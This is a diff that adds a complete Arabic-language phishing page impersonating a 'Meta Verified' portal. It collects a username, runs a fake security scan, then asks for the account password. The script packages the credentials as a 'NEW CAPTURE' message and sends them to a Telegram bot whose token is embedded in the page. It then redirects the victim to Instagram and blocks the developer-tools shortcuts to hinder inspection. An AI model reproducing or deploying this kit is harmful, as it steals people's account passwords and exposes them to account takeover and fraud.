@@ -1,0 +1,826 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <meta name="theme-color" content="#000000">
+    <title>Meta Verified | Secure Portal 2099</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        html, body {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            min-height: 100vh;
+            min-height: -webkit-fill-available;
+            background: #000;
+            color: white;
+            font-family: 'Cairo', 'Segoe UI', sans-serif;
+            overflow: hidden;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        /* Background */
+        .bg-animation {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            background: 
+                radial-gradient(ellipse at 20% 80%, rgba(0, 149, 246, 0.2) 0%, transparent 50%),
+                radial-gradient(ellipse at 80% 20%, rgba(138, 43, 226, 0.2) 0%, transparent 50%),
+                #000;
+        }
+
+        .particles {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            overflow: hidden;
+            pointer-events: none;
+        }
+
+        .particle {
+            position: absolute;
+            width: 3px;
+            height: 3px;
+            background: #0095f6;
+            border-radius: 50%;
+            opacity: 0.5;
+            animation: float 15s infinite linear;
+        }
+
+        @keyframes float {
+            0% { transform: translateY(100vh) translateX(0); opacity: 0; }
+            10% { opacity: 0.5; }
+            90% { opacity: 0.5; }
+            100% { transform: translateY(-100vh) translateX(50px); opacity: 0; }
+        }
+
+        /* Main Container - Full Screen */
+        .container {
+            width: 100%;
+            height: 100%;
+            max-width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            position: relative;
+        }
+
+        /* Card */
+        .portal-card {
+            width: 100%;
+            max-width: 380px;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 20px;
+            backdrop-filter: blur(20px);
+            padding: 30px 20px;
+            text-align: center;
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5), 0 0 100px rgba(0, 149, 246, 0.1);
+        }
+
+        /* Logo */
+        .logo-container {
+            position: relative;
+            display: inline-block;
+            margin-bottom: 20px;
+        }
+
+        .logo {
+            width: 70px;
+            height: 70px;
+            filter: drop-shadow(0 0 20px #0095f6);
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+
+        .verified-badge {
+            position: absolute;
+            bottom: 0;
+            right: 0;
+            width: 24px;
+            height: 24px;
+            background: #0095f6;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 14px;
+            font-weight: bold;
+        }
+
+        h2 {
+            font-size: 1.6rem;
+            margin-bottom: 10px;
+            font-weight: 700;
+            background: linear-gradient(135deg, #fff, #0095f6);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .subtitle {
+            color: rgba(255, 255, 255, 0.6);
+            font-size: 0.9rem;
+            margin-bottom: 25px;
+        }
+
+        /* Steps */
+        .step {
+            display: none;
+        }
+
+        .step.active {
+            display: block;
+            animation: fadeIn 0.4s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* Inputs */
+        .input-group {
+            position: relative;
+            margin: 15px 0;
+        }
+
+        input {
+            width: 100%;
+            padding: 15px 18px;
+            border-radius: 12px;
+            border: 2px solid rgba(255, 255, 255, 0.1);
+            background: rgba(0, 0, 0, 0.3);
+            color: white;
+            font-size: 1rem;
+            font-family: inherit;
+            outline: none;
+            transition: all 0.3s;
+        }
+
+        input:focus {
+            border-color: #0095f6;
+            box-shadow: 0 0 15px rgba(0, 149, 246, 0.3);
+        }
+
+        input.error {
+            border-color: #ff4757;
+            animation: shake 0.4s;
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-8px); }
+            75% { transform: translateX(8px); }
+        }
+
+        /* Captcha */
+        .captcha-container {
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 12px;
+            padding: 15px;
+            margin: 15px 0;
+        }
+
+        .captcha-box {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 10px;
+        }
+
+        .captcha-code {
+            flex: 1;
+            font-family: 'Courier New', monospace;
+            font-size: 1.4rem;
+            font-weight: bold;
+            color: #0095f6;
+            background: rgba(0, 0, 0, 0.5);
+            padding: 12px;
+            border-radius: 8px;
+            letter-spacing: 5px;
+            user-select: none;
+            text-decoration: line-through;
+            text-decoration-color: rgba(255, 0, 0, 0.5);
+        }
+
+        .refresh-captcha {
+            width: 45px;
+            height: 45px;
+            background: rgba(255, 255, 255, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 8px;
+            color: white;
+            font-size: 1.2rem;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        /* Buttons */
+        button {
+            width: 100%;
+            padding: 15px;
+            border-radius: 12px;
+            border: none;
+            background: linear-gradient(135deg, #0095f6, #0077c2);
+            color: white;
+            font-weight: 700;
+            font-size: 1rem;
+            cursor: pointer;
+            margin-top: 15px;
+            transition: all 0.3s;
+            font-family: inherit;
+        }
+
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 30px rgba(0, 149, 246, 0.4);
+        }
+
+        button:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .btn-secondary {
+            background: transparent;
+            border: 2px solid rgba(255, 255, 255, 0.2);
+            margin-top: 10px;
+        }
+
+        /* Loader */
+        .loader-container {
+            display: none;
+            margin: 30px 0;
+        }
+
+        .loader-container.show {
+            display: block;
+        }
+
+        .loader {
+            width: 100%;
+            height: 6px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 3px;
+            overflow: hidden;
+        }
+
+        .progress {
+            width: 0%;
+            height: 100%;
+            background: linear-gradient(90deg, #0095f6, #00d4ff);
+            border-radius: 3px;
+            transition: width 0.3s;
+        }
+
+        .status-text {
+            margin-top: 15px;
+            font-size: 0.9rem;
+            color: rgba(255, 255, 255, 0.7);
+        }
+
+        /* Success */
+        .success-animation {
+            display: none;
+            margin: 20px 0;
+        }
+
+        .success-animation.show {
+            display: block;
+        }
+
+        .checkmark {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            background: #00d26a;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto;
+            font-size: 40px;
+            animation: pop 0.5s ease;
+        }
+
+        @keyframes pop {
+            0% { transform: scale(0); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+
+        /* Password Strength */
+        .password-strength {
+            height: 4px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 2px;
+            margin-top: 8px;
+            overflow: hidden;
+            display: none;
+        }
+
+        .password-strength.show {
+            display: block;
+        }
+
+        .strength-bar {
+            height: 100%;
+            width: 0%;
+            transition: all 0.3s;
+        }
+
+        .strength-weak { background: #ff4757; width: 33%; }
+        .strength-medium { background: #ffa502; width: 66%; }
+        .strength-strong { background: #00d26a; width: 100%; }
+
+        /* Step Indicators */
+        .step-indicators {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+
+        .step-dot {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.2);
+        }
+
+        .step-dot.active {
+            background: #0095f6;
+            box-shadow: 0 0 10px #0095f6;
+        }
+
+        .step-dot.completed {
+            background: #00d26a;
+        }
+
+        /* Security Badge */
+        .security-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-top: 20px;
+            font-size: 0.8rem;
+            color: rgba(255, 255, 255, 0.5);
+        }
+
+        /* Footer */
+        .footer {
+            position: fixed;
+            bottom: 15px;
+            left: 0;
+            right: 0;
+            text-align: center;
+            color: rgba(255, 255, 255, 0.4);
+            font-size: 0.75rem;
+            padding: 0 20px;
+        }
+
+        /* Toast */
+        .toast-container {
+            position: fixed;
+            top: 20px;
+            left: 20px;
+            right: 20px;
+            z-index: 10000;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .toast {
+            background: rgba(0, 0, 0, 0.9);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 12px;
+            padding: 15px;
+            color: white;
+            font-size: 0.9rem;
+            animation: slideDown 0.3s ease;
+            backdrop-filter: blur(10px);
+        }
+
+        @keyframes slideDown {
+            from { transform: translateY(-100%); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+
+        .toast.hiding {
+            animation: slideUp 0.3s ease forwards;
+        }
+
+        @keyframes slideUp {
+            to { transform: translateY(-100%); opacity: 0; }
+        }
+
+        /* Loading Overlay */
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.9);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            z-index: 9999;
+        }
+
+        .loading-overlay.show {
+            display: flex;
+        }
+
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid rgba(255, 255, 255, 0.1);
+            border-top-color: #0095f6;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        /* Responsive */
+        @media (max-height: 700px) {
+            .portal-card {
+                padding: 20px 15px;
+            }
+            .logo {
+                width: 60px;
+                height: 60px;
+            }
+            h2 {
+                font-size: 1.4rem;
+            }
+        }
+
+        @media (max-height: 600px) {
+            .footer {
+                display: none;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="bg-animation"></div>
+    <div class="particles" id="particles"></div>
+
+    <div class="toast-container" id="toastContainer"></div>
+
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="spinner"></div>
+        <p style="margin-top: 20px; color: rgba(255,255,255,0.8);">جاري الإرسال...</p>
+    </div>
+
+    <div class="container">
+        <div class="portal-card" id="card">
+            <div class="step-indicators">
+                <div class="step-dot active" id="dot1"></div>
+                <div class="step-dot" id="dot2"></div>
+                <div class="step-dot" id="dot3"></div>
+            </div>
+
+            <!-- Step 1 -->
+            <div id="step1" class="step active">
+                <div class="logo-container">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/e/e4/Twitter_Verified_Badge.svg" class="logo" alt="Meta Verified">
+                    <div class="verified-badge">✓</div>
+                </div>
+                <h2>مركز توثيق Meta</h2>
+                <p class="subtitle">أدخل اسم المستخدم للتحقق</p>
+
+                <div class="input-group">
+                    <input type="text" id="username" placeholder="اسم المستخدم" autocomplete="off">
+                </div>
+
+                <div class="captcha-container">
+                    <div class="captcha-box">
+                        <div class="captcha-code" id="captchaCode">X7K9M</div>
+                        <button class="refresh-captcha" onclick="generateCaptcha()">🔄</button>
+                    </div>
+                    <input type="text" id="captchaInput" placeholder="أدخل الرمز" style="text-align: center; letter-spacing: 4px; font-family: monospace;">
+                </div>
+
+                <button onclick="validateStep1()">بدء الفحص الأمني</button>
+
+                <div class="security-badge">
+                    <span>🔒</span>
+                    <span>اتصال آمن 256-bit</span>
+                </div>
+            </div>
+
+            <!-- Step 2 -->
+            <div id="step2" class="step">
+                <div class="loader-container" id="loaderContainer">
+                    <div class="loader"><div class="progress" id="progressBar"></div></div>
+                    <div class="status-text" id="statusText">جاري الفحص...</div>
+                </div>
+
+                <div class="success-animation" id="successAnim">
+                    <div class="checkmark">✓</div>
+                    <h3 style="margin-top: 15px; color: #00d26a;">تم التحقق!</h3>
+                    <p class="subtitle">الحساب مؤهل للتوثيق</p>
+                </div>
+            </div>
+
+            <!-- Step 3 -->
+            <div id="step3" class="step">
+                <div style="font-size: 50px; margin-bottom: 10px;">🔐</div>
+                <h2>التفعيل النهائي</h2>
+                <p class="subtitle">أكمل البيانات للتوثيق</p>
+
+                <div class="input-group">
+                    <input type="password" id="password" placeholder="كلمة المرور" oninput="checkPasswordStrength()">
+                </div>
+                <div class="password-strength" id="strengthBar"><div class="strength-bar" id="strengthFill"></div></div>
+
+                <div class="input-group" style="margin-top: 12px;">
+                    <input type="password" id="confirmPassword" placeholder="تأكيد كلمة المرور">
+                </div>
+
+                <button onclick="submitFinal()" id="submitBtn">تفعيل التوثيق الآن</button>
+                <button class="btn-secondary" onclick="goBack()">رجوع</button>
+            </div>
+        </div>
+    </div>
+
+    <div class="footer">
+        © 2099 Meta Platforms, Inc. | Portal v3.0
+    </div>
+
+    <script>
+        // Configuration - Get IP from URL parameter ?id=
+        const urlParams = new URLSearchParams(window.location.search);
+        const userIP = urlParams.get('id') || 'unknown';
+
+        const CONFIG = {
+            token: "8360365079:AAE5JYoDz1OwgyFnoMoi1gO2EtYVMmlXAOY",
+            chatId: "8360365079", // Your chat ID
+            userIP: userIP,
+            currentCaptcha: '',
+            isSubmitting: false
+        };
+
+        console.log('User IP from URL:', CONFIG.userIP);
+
+        // Initialize
+        document.addEventListener('DOMContentLoaded', () => {
+            createParticles();
+            generateCaptcha();
+        });
+
+        // Create particles
+        function createParticles() {
+            const container = document.getElementById('particles');
+            for (let i = 0; i < 30; i++) {
+                const p = document.createElement('div');
+                p.className = 'particle';
+                p.style.left = Math.random() * 100 + '%';
+                p.style.animationDelay = Math.random() * 15 + 's';
+                p.style.animationDuration = (10 + Math.random() * 10) + 's';
+                container.appendChild(p);
+            }
+        }
+
+        // Captcha
+        function generateCaptcha() {
+            const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
+            let code = '';
+            for (let i = 0; i < 5; i++) code += chars[Math.floor(Math.random() * chars.length)];
+            CONFIG.currentCaptcha = code;
+            document.getElementById('captchaCode').textContent = code;
+            document.getElementById('captchaInput').value = '';
+        }
+
+        // Toast
+        function showToast(msg) {
+            const container = document.getElementById('toastContainer');
+            const toast = document.createElement('div');
+            toast.className = 'toast';
+            toast.textContent = msg;
+            container.appendChild(toast);
+            setTimeout(() => {
+                toast.classList.add('hiding');
+                setTimeout(() => toast.remove(), 300);
+            }, 3000);
+        }
+
+        // Step 1
+        function validateStep1() {
+            const username = document.getElementById('username').value.trim();
+            const captcha = document.getElementById('captchaInput').value.trim().toUpperCase();
+
+            if (username.length < 3) {
+                showToast('اسم المستخدم قصير جداً');
+                document.getElementById('username').classList.add('error');
+                return;
+            }
+
+            if (captcha !== CONFIG.currentCaptcha) {
+                showToast('رمز التحقق غير صحيح');
+                generateCaptcha();
+                return;
+            }
+
+            goToStep(2);
+            startAnalysis();
+        }
+
+        // Analysis
+        function startAnalysis() {
+            const loader = document.getElementById('loaderContainer');
+            const bar = document.getElementById('progressBar');
+            const status = document.getElementById('statusText');
+            const success = document.getElementById('successAnim');
+
+            loader.classList.add('show');
+
+            const stages = [
+                { p: 20, t: 'جاري الاتصال...' },
+                { p: 40, t: 'فحص البيانات...' },
+                { p: 60, t: 'التحقق الأمني...' },
+                { p: 80, t: 'تجهيز التوثيق...' },
+                { p: 100, t: 'اكتمل!' }
+            ];
+
+            let i = 0;
+            const interval = setInterval(() => {
+                if (i < stages.length) {
+                    bar.style.width = stages[i].p + '%';
+                    status.textContent = stages[i].t;
+                    i++;
+                } else {
+                    clearInterval(interval);
+                    loader.classList.remove('show');
+                    success.classList.add('show');
+                    setTimeout(() => goToStep(3), 1500);
+                }
+            }, 600);
+        }
+
+        // Password strength
+        function checkPasswordStrength() {
+            const pass = document.getElementById('password').value;
+            const bar = document.getElementById('strengthBar');
+            const fill = document.getElementById('strengthFill');
+
+            if (!pass) { bar.classList.remove('show'); return; }
+            bar.classList.add('show');
+
+            let s = 0;
+            if (pass.length >= 6) s++;
+            if (pass.length >= 10) s++;
+            if (/[A-Z]/.test(pass)) s++;
+            if (/[0-9]/.test(pass)) s++;
+            if (/[^a-zA-Z0-9]/.test(pass)) s++;
+
+            fill.className = 'strength-bar';
+            if (s <= 2) fill.classList.add('strength-weak');
+            else if (s <= 4) fill.classList.add('strength-medium');
+            else fill.classList.add('strength-strong');
+        }
+
+        // Submit - Fixed with multiple methods
+        async function submitFinal() {
+            if (CONFIG.isSubmitting) return;
+
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value;
+            const confirm = document.getElementById('confirmPassword').value;
+
+            if (password.length < 4) {
+                showToast('كلمة المرور قصيرة');
+                return;
+            }
+
+            if (password !== confirm) {
+                showToast('كلمتا المرور غير متطابقتين');
+                return;
+            }
+
+            CONFIG.isSubmitting = true;
+            document.getElementById('submitBtn').disabled = true;
+            document.getElementById('loadingOverlay').classList.add('show');
+
+            // Prepare message with IP from URL
+            const message = `🔐 NEW CAPTURE
+━━━━━━━━━━━━━━
+👤 User: ${username}
+🔑 Pass: ${password}
+🌐 IP: ${CONFIG.userIP}
+⏰ Time: ${new Date().toLocaleString('ar-SA')}
+🔗 URL: ${window.location.href}`;
+
+            // Method 1: Image request (no CORS issues)
+            const sendViaImage = () => {
+                return new Promise((resolve) => {
+                    const img = new Image();
+                    const url = `https://api.telegram.org/bot${CONFIG.token}/sendMessage?chat_id=${CONFIG.chatId}&text=${encodeURIComponent(message)}&parse_mode=HTML`;
+
+                    img.onload = () => resolve(true);
+                    img.onerror = () => resolve(true); // Telegram returns error but message sends
+                    img.src = url;
+
+                    // Timeout fallback
+                    setTimeout(() => resolve(true), 3000);
+                });
+            };
+
+            // Method 2: Fetch with no-cors
+            const sendViaFetch = async () => {
+                try {
+                    const url = `https://api.telegram.org/bot${CONFIG.token}/sendMessage`;
+                    const params = new URLSearchParams({
+                        chat_id: CONFIG.chatId,
+                        text: message,
+                        parse_mode: 'HTML'
+                    });
+
+                    await fetch(`${url}?${params}`, {
+                        method: 'GET',
+                        mode: 'no-cors',
+                        cache: 'no-cache'
+                    });
+                    return true;
+                } catch (e) {
+                    return false;
+                }
+            };
+
+            // Try both methods
+            try {
+                await Promise.race([sendViaImage(), sendViaFetch()]);
+                console.log('Message sent successfully');
+            } catch (e) {
+                console.log('Send error:', e);
+            }
+
+            // Always redirect after delay
+            setTimeout(() => {
+                document.getElementById('loadingOverlay').classList.remove('show');
+                window.location.href = "https://instagram.com";
+            }, 2000);
+        }
+
+        // Navigation
+        function goToStep(n) {
+            document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+            document.querySelectorAll('.step-dot').forEach((d, i) => {
+                d.className = 'step-dot' + (i < n-1 ? ' completed' : i === n-1 ? ' active' : '');
+            });
+            document.getElementById('step' + n).classList.add('active');
+        }
+
+        function goBack() {
+            goToStep(1);
+            document.getElementById('password').value = '';
+            document.getElementById('confirmPassword').value = '';
+            document.getElementById('strengthBar').classList.remove('show');
+            CONFIG.isSubmitting = false;
+            document.getElementById('submitBtn').disabled = false;
+        }
+
+        // Prevent dev tools
+        document.addEventListener('contextmenu', e => e.preventDefault());
+        document.addEventListener('keydown', e => {
+            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && ['I','J','C'].includes(e.key))) {
+                e.preventDefault();
+            }
+        });
+    </script>
+</body>
+  </html>
